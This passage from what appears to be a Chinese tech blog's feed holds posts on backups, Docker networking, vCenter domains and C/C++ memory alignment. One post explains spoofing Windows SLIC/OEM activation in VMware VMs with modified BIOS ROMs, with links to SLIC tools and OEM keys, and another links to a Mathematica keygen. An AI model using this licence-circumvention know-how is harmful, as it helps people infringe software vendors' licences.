id="对于日常的文件">对于日常的文件</h3><p>如果你的电脑有多个硬盘的话，可以在每个硬盘中存贮一个副本。<strong>（注意有些分区处在同一个硬盘中！）</strong></p><p>但是这样有悖于异地原则（以防电脑受到物理损伤），建议使用云存储或者移动硬盘增加一份备份。（涉密不上网，上网不涉密，涉密数据切勿在线备份）</p><h3 id="对于你的全部数据">对于你的全部数据</h3><p>如果你的重要资料很多，且你很有学习能力，你可以选择全量备份。全量备份提供了在灾难发生后快速的恢复能力，具体可以使用各种还原软件，这里也不再赘述。仅提供几个方案：P2V,Ghost, Dism镜像, TimeMachine, 以及类似的快照方案。</p><h2 id="写在最后">写在最后</h2><p>作为和计算机打交道的人或者是行业从业者，数据备份总不是坏事，应该养成良好的备份习惯。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM启动中基于BIOS/EFI的SLP/SLIC欺骗</title>
      <link href="/2022/11/04/vm-qi-dong-zhong-ji-yu-bios-efi-de-slp-slic-qi-pian/"/>
      <url>/2022/11/04/vm-qi-dong-zhong-ji-yu-bios-efi-de-slp-slic-qi-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="vm启动中基于biosefi的slpslic欺骗">VM启动中基于BIOS/EFI的SLP/SLIC欺骗</h1><h2 id="什么是-slp-slic">什么是 SLP / SLIC</h2><p>微软用SLIC来确定用户是否为OEM正版。OEM（微软为特定的 Partner发放操作系统的 OEM版本，以满足合作双赢的需求。这些OEM版本的操作系统随机器预安装，并采用批量许可的授权模式。这样的批量许可难以有效识别合法用户和非法用户，可能被滥用而导致版权问题。为了控制这个问题，微软规定在安装每一个操作系统时将其激活。OEM可在安装过程中根据OEM和批量许可的媒体安装映像。</p><p>一般主板是硬件升级中最不可能更换的部件，所以要识别一台机器是否为OEM合法用户，可以在每台预装操作系统的机器主板上，在BIOS里写入特定的信息，来标示这是一台OEM合法用户的机器。这样的信息就是SLIC。不同的OEM厂商的SLIC不同，所以他们的OEM操作系统不能混用。在没有预装系统的机器，即便是品牌机，也不会含有SLIC信息。这样，OEM版的操作系统就可以限定在OEM机器上使用。</p><p>SLP 1.0 (只支持 BIOS440 - OEM SLP 信息) – XP, Server 2003/2003R2（基本上是明文存储OEM信息字符串） SLP 2.6 (BIOS.440 &amp; EFIs - Dell2.6 SLIC) - NT 6.0 (Vista/Server 2008), NT 6.1 (7/Server 2008 R2), NT6.2 (Server 2012), NT 6.3 (Server 2012 R2), NT 10.0 (Server 2016/Server2019/Server 2022)</p><p>SLIC 2.6 向后兼容所有之前的 SLIC 版本。</p><h2 id="验证过程">验证过程</h2><ol type="1"><li><p>安装时用户需要输入光盘盒上的序列号（CD-KEY）。对于随机购买了OEM版本Vista的用户，可以在主机上找到一个相应版本的标签，作为购买VistaOEM版的凭证。标签上面有一个带有象征意义的序列号，因为OEM版本的用户并不需要输入序列号。系统根据序列号识别Vista的不同版本，如基本家庭版、高级家庭版、商业版、旗舰版等。安装完毕后，序列号会被转换为四组字母或数字，即在“系统属性”里看到的“产品ID”。其中第二组是“OEM”的，即为OEM版本的序列号（CD-KEY）。从这里开始，产品ID代替了CD-KEY。同时，安装程序为OEM版本的安装生成一个OEM证书。</p></li><li><p>当每次系统启动时，BIOS里的信息就会被加载到内存中。</p></li><li><p>当登录Vista系统之后，系统调用SLP服务，验证操作系统的许可权，尤其是激活状态。开始根据产品ID来识别系统的授权状态。如果没有检测到产品ID或者没有检测到合法的零售版产品ID，则视为未激活。如果检测到合法的零售版产品ID，则视为成功激活。如果检测到OEM版的产品ID，则继续验证。</p></li><li><p>如果检测到OEM版产品ID，验证过程启动，并检查已安装的OEM证书是否正确。主要是用先前从BIOS加载到内存里的SLIC的公钥验证产品证书的数字签名。如果验证失败，则视为未激活。</p></li><li><p>验证ACPI里SLIC与RSDT（Root System Des criptionTable，根系统描述表）的OEMID字段比较，以及用ACPI里SLIC标志和XSDT（Extended System Des criptionTable，扩展系统描述表）中的OEM ID和OEM TableID字段比较，如果不一致，则视为未激活。</p></li><li><p>经过以上过程后，方视为正确的OEM授权，否则视为未激活并按照相关流程处理，例如要求激活。</p></li></ol><h3 id="slp-2.0">SLP 2.0</h3><ol type="1"><li>如果检测到SLP产品密钥（SLP与用的CD-KEY），SLP验证过程启动。</li><li>Windows确认其包含（导入）的OEM证书是微软签名的。如果检测到OEM证书，则SLP验证继续进行。如果未检测到OEM证书，则SLP验证失败，要求进行产品激活。3.OEM证书将同ACPI_SLICBIOS表中的OEM公钥做比较。如果OEM证书和BIOS中的OEM公钥匹配，则SLP验证过程继续进行。如果OEM证书和BIOS中的OEM公钥不匹配，则SLP验证失败，要求进行产品激活。</li><li>ACPI_SLICBIOS表中也包含SLP标志。通过OEM公钥验证SLP标志，如通过，SLP验证过程继续。否则，SLP验证失败，要求进行产品激活。</li><li>SLP标志中包括OEMID字串和OEMTableID字串，与ACPI_RSDT和ACPI_XSDT的OEMID和OEMTableID比较，若其中之一与SLP标志中的字串完全相符，则SLP验证通过。否则，SLP验证失败，要求进行产品激活。</li></ol><h2 id="破解">破解</h2><p>破解SLIC一般有硬件破解和软件破解两种思路，并已经有相应的实现。</p><p>硬件修改就是所谓“刷BIOS”，将OEM机器里的BIOS信息提取出来，并复制到其它机器上。这样做的优点是，对操作系统而言，几乎无异于合法的OEM机器。但缺点也是技术难度高、风险大，如果不是老手，或刷BIOS时出现停电或读写故障，系统将无法正常启动，通常需要返厂处理。</p><p>软件修改就是利用操作系统只读取从BIOS载入内存的副本而不是BIOS本身这一弱点，在启动Vista之前，修改内存上的副本，使之无异于OEM机器。这样做的优点是，风险小。缺点是内存的信息和BIOS中的信息不同，当计算机休眠后，BIOS信息会被重新写入内存，原有的破解会被覆盖。</p><h2 id="vmware">VMware</h2><h3 id="vmware-workstation-desktop">VMware Workstation (Desktop)</h3><p>桌面端的 BIOS 替换可以采用两种思路：</p><ol type="1"><li>在 <code>&lt;VM&gt;.vmx</code> 指定 BIOS 文件参数</li><li>不加参数，让其 Fallback 至系统，并替换 VMware 自身的 BIOS/EFI ROM文件</li></ol><h4 id="method-1">Method 1</h4><p>向配置文件中加入 <code>bios440.filename = "vmbios.ROM"</code></p><p>具体要换成对应的ROM文件名，ROM 文件置于<strong>.vmx文件所在目录</strong>，使用相对路径访问；或者其他目录，使用绝对路径。</p><h4 id="method-2">Method 2</h4><p>VMware 自身的 BIOS/EFI 文件位于<code>...\VMware\VMware Workstation\x64</code>.</p><ul><li><code>BIOS.440.ROM</code> - BIOS</li><li><code>EFI32.ROM</code> - UEFI x86</li><li><code>EFI64.ROM</code> - UEFI x64</li></ul><h3 id="vmware-vsphere-hypervisor-esxi-server">VMware vSphere Hypervisor(ESXi) (Server)</h3><p>同样的，服务器可以使用如上方法，但是要注意：BIOS文件需要放置于<code>/vmfs/</code> 下的 <strong>datastore</strong>中，并使用绝对目录。</p><p>或者使用 <code>SMBIOS.reflectHost = "true"</code> 将宿主机 OEM信息直通，需要宿主机 OEM 为微软 Partner.</p><blockquote><p>详见：http://kb.vmware.com/kb/1002095</p></blockquote><h4 id="向-esxi-集成-slic-信息">向 ESXi 集成 SLIC 信息</h4><p><a href="https://forums.mydigitallife.net/threads/howto-modify-vmware-bios-with-slic-2-1.19329/#post-572440">modify-vmware-bios-with-slic</a></p><p>大同小异</p><h2 id="相关附件工具">相关附件&amp;工具</h2><ul><li><a href="http://rweverything.com/">rw-everything</a></li><li><a href="https://forums.mydigitallife.net/threads/tool-to-insert-replace-slic-in-phoenix-insyde-dell-efi-bioses.13194/">Toolto Insert/Replace SLIC in Phoenix / Insyde / Dell / EFI BIOSes</a></li><li><a href="https://d-fault.nl/keys">d-fault.nl/keys - OEMCD-Key</a></li><li><a href="https://forums.mydigitallife.net/threads/modded-vmware-workstation-player-multi-brand-bios-installer.43613/?p=803024&amp;viewfull=1#post803024">VmwareWorkstation/Player Multi Brand Bios Installer</a></li><li><a href="https://www.jianshu.com/p/f62f78b19447">Vmware Workstation12 中激活 Windows 7</a></li><li><a href="http://www.usbmi.com/2298.html">集成SLIC2.6、MSDM、OSX</a></li><li><a href="https://royer-wang.blogspot.com/2013/09/linux-vmware-windows-7.html">linux-vmware-windows-7</a></li><li><a href="/files/slic_files.zip">slic_files.zip</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> UEFI </tag>
            
            <tag> BIOS </tag>
            
            <tag> SLP </tag>
            
            <tag> SLIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Dekstop Windows 网络问题</title>
      <link href="/2022/11/04/docker-dekstop-windows-wang-luo-wen-ti/"/>
      <url>/2022/11/04/docker-dekstop-windows-wang-luo-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-dekstop-windows-网络问题">Docker Dekstop Windows网络问题</h1><h1 id="现象">现象</h1><p>更改 Docker Subnet 后 WSL2 Engine 无法启动。</p><h2 id="原因">原因</h2><p>Docker 默认情况下使用 192.168.65.0/28 大小的子网，但由于 <a href="https://github.com/docker/for-win/issues/13025">issues/13025</a>的原因，<code>/28</code> 大小的子网不被 Windows 支持。导致 WSL2无法启动，需要删除配置或者重新安装。</p><h3 id="subnet-配置">Subnet 配置</h3><p><code>vpnkitCIDR": "192.168.65.0/24</code></p><h2 id="docs">docs</h2><p>在 docker 官方的 docs 中也有提及</p><blockquote><p><a href="https://docs.docker.com/desktop/settings/windows/#network">https://docs.docker.com/desktop/settings/windows/#network</a></p></blockquote><p>在 Windows 中不应更改 Network 设置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker将AnyConnectVPN容器化</title>
      <link href="/2022/11/02/shi-yong-docker-jiang-anyconnectvpn-rong-qi-hua/"/>
      <url>/2022/11/02/shi-yong-docker-jiang-anyconnectvpn-rong-qi-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-docker-将anyconnectvpn容器化">使用 docker将AnyConnectVPN容器化</h1><h2 id="简介">简介</h2><p>基本思路是在容器中跑一个 OpenConnect 客户端，然后开放一个 SOCKS5代理，再暴露给本地 Loopback.</p><p>转发成 SOCKS 代理这一步需要使用 ocproxy。</p><h2 id="docker">docker</h2><p>Login Credentials 通过 <code>docker run -e</code>传参传入容器，再通过入口点的 shell 调用即可。没什么难的。</p><h3 id="网络">网络</h3><p>（可选）要在 <code>~/.wslconfig</code> 中加入<code>localhostforwarding=true</code> 来把 docker 所在 WSL2 主机的localhost 转发到 Windows 的 localhost。</p><!--## Refer- [被拦了怎么办（校园网知识普及）](https://eoj.i64d.com/blog/entry/173/)-->]]></content>
      
      
      
        <tags>
            
            <tag> AnyConnect </tag>
            
            <tag> Cisco </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑实验软件</title>
      <link href="/2022/10/29/shu-zi-luo-ji-shi-yan-ruan-jian/"/>
      <url>/2022/10/29/shu-zi-luo-ji-shi-yan-ruan-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="hust">HUST</h2><p>https://gitee.com/totalcontrol/hustzc/tree/master/%E9%A2%84%E8%A3%85%E8%BD%AF%E4%BB%B6</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>分光监听 SR-IOV 游记</title>
      <link href="/2022/10/29/fen-guang-jian-ting-sr-iov-you-ji/"/>
      <url>/2022/10/29/fen-guang-jian-ting-sr-iov-you-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="问题">问题</h2><blockquote><p>Windows 提示“网络电缆已拔出”</p></blockquote><p>需要安装低于26.3的 Intel 网卡驱动</p><h2 id="refer">Refer</h2><ul><li><a href="https://www.juniper.net/documentation/cn/zh/software/vmx/vmx-vmware/topics/task/vmx-sriov-enabling-vmware.html">为VMware 启用 SR-IOV</a></li><li><a href="https://www.right.com.cn/forum/thread-5626188-1-1.html">在ESXi添加多个SR-IOV网卡给VM(OP/爱快) 桥接网口后无法访问</a></li><li><a href="view-source:https://webcache.googleusercontent.com/search?q=cache:v27QR5aa8ZIJ:https://www.chiphell.com/forum.php%3Fmod%3Dviewthread%26tid%3D2428726%26extra%3Dpage%253D1%26mobile%3D2&amp;cd=1&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk">DeepShit</a></li><li><a href="https://forum.level1techs.com/t/solved-sr-iov-network-works-for-linux-but-not-windows/179507">[Solved]SR-IOV Network works for Linux but not Windows?</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>创建包含vCenter Server的VCSA集群</title>
      <link href="/2022/10/29/chuang-jian-bao-han-vcenter-server-de-vcsa-ji-qun/"/>
      <url>/2022/10/29/chuang-jian-bao-han-vcenter-server-de-vcsa-ji-qun/</url>
      
        <content type="html"><![CDATA[<h2 id="tldr">TL;DR</h2><p>这里 VMware 官方的文档写的比较绕。正常来说，在部署 VMware vCenterServer Appliance (VCSA) 时，一般都会集成一个用来管理自身的 PlatformService Controller（称为嵌入式 Platform Service Controller / PSC）。</p><h3 id="什么是-psc">什么是 PSC？</h3><p>可以理解为一个 VCSA 的辅助和守护服务。</p><p>提供的主要服务： - 通过 vCenter Single Sign-On (SSO) 进行身份验证 -使用 VMware 证书管理器 (VMCA) 证书配置 ESXi 主机 - 调取存储在 VMware端点证书存储 (VECS) 中的自定义证书。</p><h2 id="连接两个独立的vcsa服务器">连接两个独立的VCSA服务器</h2><blockquote><p>这里如果要查找 VMware的官方文档的话，关键词是：<strong>重新指向另一个现有域</strong></p></blockquote><p>需要：</p><ol type="1"><li>需要版本大于等于 vCenter Server 6.7 Update 1</li><li>互相连接的 vCenter Server 版本需要一致</li><li>先备份！</li></ol><p><img src="https://googles.plus/images/loading.gif" data-original="https://docs.vmware.com/cn/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/images/GUID-E3C00B84-90CE-4A98-8071-2B0AFCF3F841-high.png"></p><h2 id="过程">过程</h2><ol type="1"><li><p>在开始连接之前，请确保两个VCSA节点均是在线状态。</p></li><li><p>（可选） 提前检查是否能正常迁移</p><p>运行预检查模式命令。预检查模式将从 vCenter Server提取标记数据（标记和类别）和授权数据（角色和特权）。预检查不会迁移任何数据，但会检查源和目标vCenter Server 之间发生的冲突。例如，使用以下 CLI 运行预检查：</p><pre class="line-numbers language-none"><code class="language-none">cmsso-util domain-repoint -m pre-check --src-emb-admin Administrator --replication-partner-fqdn FQDN_of_destination_node --replication-partner-admin PSC_Admin_of_destination_node --dest-domain-name destination_PSC_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><blockquote><p>这里的用户名请自己注意带不带 @ 后的部分</p></blockquote><blockquote><p><strong>注：</strong>如果复制合作伙伴不存在（重新指向新创建的域），则不需要预检查。</p></blockquote><p>有关 <code>cmsso-util domain-repoint</code> 命令的参数定义，请参见 <a href="https://docs.vmware.com/cn/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/GUID-C021F1DB-551A-4F73-8A38-437AE6D5CFEF.html#GUID-C021F1DB-551A-4F73-8A38-437AE6D5CFEF">域重新指向命令的语法</a>。</p><p>预检查将冲突写入 <strong>/storage/domain-data</strong> 目录。</p><ol start="3" type="1"><li>（可选）查看冲突，然后针对所有冲突应用解决方法或针对每个冲突应用单独的解决方法。</li></ol><p>冲突解决方法包括：</p><ul><li>复制：在目标域中创建数据副本。</li><li>跳过：跳过将数据复制到目标域。</li><li>Merge：合并冲突但不创建副本。</li></ul><blockquote><p><strong>注：</strong>标记和授权冲突的默认解决方法模式为“复制”，除非在预检查期间生成的冲突文件中被替代。</p></blockquote><ol start="4" type="1"><li><p>运行 <code>execute</code>命令。在执行模式下，在预检查模式期间生成的数据将读取并导入到目标节点。然后将vCenter Server重新指向目标域。例如，在没有复制合作伙伴的情况下重新指向时，请运行带以下选项的<code>execute</code> 命令：</p><pre class="line-numbers language-none"><code class="language-none">cmsso-util domain-repoint -m execute --src-emb-admin Administrator --dest-domain-name destination_PSC_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有关 <code>cmsso-util domain-repoint</code> 命令的参数定义，请参见 <a href="https://docs.vmware.com/cn/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/GUID-C021F1DB-551A-4F73-8A38-437AE6D5CFEF.html#GUID-C021F1DB-551A-4F73-8A38-437AE6D5CFEF">域重新指向命令的语法</a>。</p></li></ol><h2 id="refer">Refer</h2><ul><li><a href="https://docs.vmware.com/cn/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/GUID-28156B0F-09AD-4B44-BC29-BFA91773DD46.html">Repointa Single Embedded Node to an Existing Domain without a ReplicationPartner</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> VMware </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++中的内存对齐</title>
      <link href="/2022/10/28/c-c-zhong-de-nei-cun-dui-qi/"/>
      <url>/2022/10/28/c-c-zhong-de-nei-cun-dui-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="cc中的内存对齐">C/C++中的内存对齐</h1><h2 id="什么是内存对齐">什么是内存对齐</h2><p>还是用一个例子带出这个问题，看下面的小程序，理论上，32位系统下，int占4byte，char占一个byte，那么将它们放到一个结构体中应该占4+1=5byte；但是实际上，通过运行程序得到的结果是8byte，这就是内存对齐所导致的。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 32-bit OS</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">char</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 8</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现代计算机中内存空间都是按照 byte划分的，从理论上讲似乎对任何类型的变量的访问可以从任何地址开始，但是实际的计算机系统对基本类型数据在内存中存放的位置有限制，它们会要求这些数据的首地址的值是某个数k（通常它为4或8）的倍数，这就是所谓的内存对齐。</p><h2 id="为什么要进行内存对齐">为什么要进行内存对齐</h2><p>尽管内存是以字节为单位，但是大部分处理器并不是按字节块来存取内存的.它一般会以双字节,四字节,8字节,16字节甚至32字节为单位来存取内存，我们将上述这些存取单位称为内存存取粒度.</p><p>现在考虑4字节存取粒度的处理器取int类型变量（32位系统），该处理器只能从地址为4的倍数的内存开始读取数据。</p><p>假如没有内存对齐机制，数据可以任意存放，现在一个int变量存放在从地址1开始的联系四个字节地址中，该处理器去取数据时，要先从0地址开始读取第一个4字节块,剔除不想要的字节（0地址）,然后从地址4开始读取下一个4字节块,同样剔除不要的数据（5，6，7地址）,最后留下的两块数据合并放入寄存器.这需要做很多工作.</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-3f40af513a94901b36ceb5387982277e_720w.webp"></p><p>现在有了内存对齐的，int类型数据只能存放在按照对齐规则的内存中，比如说0地址开始的内存。那么现在该处理器在取数据时一次性就能将数据读出来了，而且不需要做额外的操作，提高了效率。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-361e2d16876ce8383c9e6ea2dca34474_720w.webp"></p><p>##对齐规则</p><p>每个特定平台上的编译器都有自己的默认“对齐系数”（也叫对齐模数）。gcc中默认#pragmapack(4)，可以通过预编译命令#pragma pack(n)，n =1,2,4,8,16来改变这一系数。</p><p>有效对其值：是给定值#pragmapack(n)和结构体中最长数据类型长度中较小的那个。有效对齐值也叫<strong>对齐单位</strong>。</p><p>了解了上面的概念后，我们现在可以来看看内存对齐需要遵循的规则：</p><ol type="1"><li><p>结构体第一个成员的<strong>偏移量（offset）</strong>为0，以后每个成员相对于结构体首地址的offset都是<strong>该成员大小与有效对齐值中较小那个</strong>的整数倍，如有需要编译器会在成员之间加上填充字节。</p></li><li><p><strong>结构体的总大小</strong>为 有效对齐值的<strong>整数倍</strong>，如有需要编译器会在最末一个成员之后加上填充字节。</p></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 32-bit OS</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">char</span> c1<span class="token punctuation">;</span>      <span class="token keyword">char</span> c2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>x1<span class="token punctuation">;</span><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> c1<span class="token punctuation">;</span>      <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">char</span> c2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>x2<span class="token punctuation">;</span><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> c1<span class="token punctuation">;</span>      <span class="token keyword">char</span> c2<span class="token punctuation">;</span>     <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>x3<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 8</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 12</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 8</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上测试都是在Linux环境下进行的，Linux下默认#pragmapack(4)，且结构体中最长的数据类型为4个字节，所以有效对齐单位为4字节，下面根据上面所说的规则以s2来分析其内存布局：</p><p>首先使用规则1，对成员变量进行对齐：</p><p>sizeof(c1) = 1 &lt;= 4(有效对齐位)，按照1字节对齐，占用第0单元；</p><p>sizeof(i) = 4 &lt;=4(有效对齐位)，相对于结构体首地址的偏移要为4的倍数，占用第4，5，6，7单元；</p><p>sizeof(c2) = 1 &lt;=4(有效对齐位)，相对于结构体首地址的偏移要为1的倍数，占用第8单元；</p><p>然后使用规则2，对结构体整体进行对齐：</p><p>s2中变量i占用内存最大占4字节，而有效对齐单位也为4字节，两者较小值就是4字节。因此整体也是按照4字节对齐。由规则1得到s2占9个字节，此处再按照规则2进行整体的4字节对齐，所以整个结构体占用12个字节。</p><p>根据上面的分析，不难得出上面例子三个结构体的内存布局如下：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-86c644ce29b1e2d3858380aaa631cc1d_720w.webp"></p><h2 id="pragma-packn">*<strong>#pragma pack(n)*</strong></h2><p>不同平台上编译器的 pragma pack默认值不同。而我们可以通过预编译命令<code>#pragma pack(n)</code>, n=1,2,4,8,16来改变对齐系数。</p><p>例如，对于上个例子的三个结构体，如果前面加上<code>#pragma pack(1)</code>，那么此时有效对齐值为1字节，此时根据对齐规则，不难看出成员是连续存放的，三个结构体的大小都是6字节。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-672ebe0ccc1430adbda00dfd7abc0375_720w.webp"></p><p>如果前面加上<code>#pragma pack(2)</code>，有效对齐值为2字节，此时根据对齐规则，三个结构体的大小应为6,8,6。内存分布图如下：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic4.zhimg.com/80/v2-1c35bc20c76d85d07855901964488637_720w.webp"></p><p>在编码中定义结构体时需要考虑成员变量定义的先后顺序。</p><h2 id="内存物理结构">内存物理结构</h2><p>一般内存的外形图片如下图：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-279e1b14a8987fd3c66cd36fc1094f4e_720w.webp"></p><p>一个内存是由若干个黑色的内存颗粒构成的。每一个内存颗粒叫做一个chip。每个chip内部，是由8个bank组成的。其构造如下图：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic4.zhimg.com/80/v2-9de00833f6951e72c9055d650aa10773_720w.webp"></p><p>而每一个bank是一个二维平面上的矩阵，前面文章中我们说到过。矩阵中每一个元素中都是保存了1个字节，也就是8个bit。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-bce5ab632b91f706de34e51daf8706da_720w.webp"></p><h2 id="内存编址方式">内存编址方式</h2><p>那么对于我们在应用程序中内存中地址连续的8个字节,例如<code>0x0000-0x0007</code>，是从位于bank上的呢？直观感觉，应该是在第一个bank上吗？其实不是的，程序员视角看起来连续的地址0x0000-0x0007，实际上位8个bank中的，每一个bank只保存了一个字节。在物理上，他们并不连续。下图很好地阐述了实际情况。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic4.zhimg.com/80/v2-482be4b2463cb2c092beac28a64e0477_720w.webp"></p><p>你可能想知道这是为什么，原因是电路工作效率。内存中的8个bank是可以并行工作的。如果你想读取址<code>0x0000-0x0007</code>，每个bank工作一次，拼起来就是你要的数据，IO效率会比较高。但要存在一个bank里，那这个bank只能自己干活。只能串行进行读取，需要读8次，这样速度会慢很多。</p><h2 id="结论">结论</h2><p><strong>所以，内存对齐最最底层的原因是内存的IO是以8个字节64bit为单位进行的。</strong>对于64位数据宽度的内存，假如CPU也是64位的CPU（现在的计算机基本都是这样的），每次内存IO获取数据都是从同行同列的8个bank中各自读取一个字节拼起来的。从内存的0地址开始，0-7字节的数据可以一次IO读取出来，8-15字节的数据也可以一次读取出来。</p><p>换个例子，假如你指定要获取的是<code>0x0001-0x0008</code>，也是8字节，但是不是<strong>0</strong>开头的，内存需要怎么工作呢？没有好办法，内存只好先工作一次把<code>0x0000-0x0007</code>取出来，然后再把<code>0x0008-0x0015</code>取出来，把两次的结果都返回给你。CPU和内存IO的硬件限制导致没办法一次跨在两个数据宽度中间进行IO。这样你的应用程序就会变慢，算是计算机因为你不懂内存对齐而给你的一点点惩罚。</p><blockquote><p><strong>扩展1：</strong>事实上，编译和链接器会自动替开发者对齐内存的，尽量帮你保证一个变量不跨列寻址。但是他不能做到十分完美。<strong>扩展2：</strong>其实在内存硬件层上，还有操作系统层。操作系统还管理了CPU的一级、二级、三级缓存。不知道你有没有印象，我们前面的文章说过高速缓存里的CacheLine也是64字节，它是内存IO的整数倍，不会让内存IO浪费。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco UCS 服务器101</title>
      <link href="/2022/10/22/cisco-ucs-fu-wu-qi-101/"/>
      <url>/2022/10/22/cisco-ucs-fu-wu-qi-101/</url>
      
        <content type="html"><![CDATA[<h1 id="cisco-ucs-服务器-101">Cisco UCS 服务器 101</h1><h2 id="cimc-网页无法打开">CIMC 网页无法打开</h2><p>原因是出场默认只能通过 HTTPS 访问，并且需要浏览器支持 AdobeFlash。</p><p>需要使用遨游浏览器国际版或者CEF框架内集成Flash的浏览器。</p><h2 id="芜湖起飞">芜湖起飞</h2><p>Power Policies 内调整电源选项至 Power Efficient</p>]]></content>
      
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS数学101-Mathematica</title>
      <link href="/2022/10/18/cs-shu-xue-101-mathematica/"/>
      <url>/2022/10/18/cs-shu-xue-101-mathematica/</url>
      
        <content type="html"><![CDATA[<h2 id="安装">安装</h2><ul><li><a href="https://tiebamma.github.io/InstallTutorial/">Mathematica的安装、激活、入门、常见问题</a></li><li><a href="https://ibug.io/blog/2019/05/mathematica-keygen/">WolframMathematica 13 Key Generator Online</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 数学 </tag>
            
            <tag> 建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SDN实践：虚拟化集群下一代安全网关-NSX</title>
      <link href="/2022/10/17/sdn-shi-jian-xu-ni-hua-ji-qun-xia-yi-dai-an-quan-wang-guan-nsx/"/>
      <url>/2022/10/17/sdn-shi-jian-xu-ni-hua-ji-qun-xia-yi-dai-an-quan-wang-guan-nsx/</url>
      
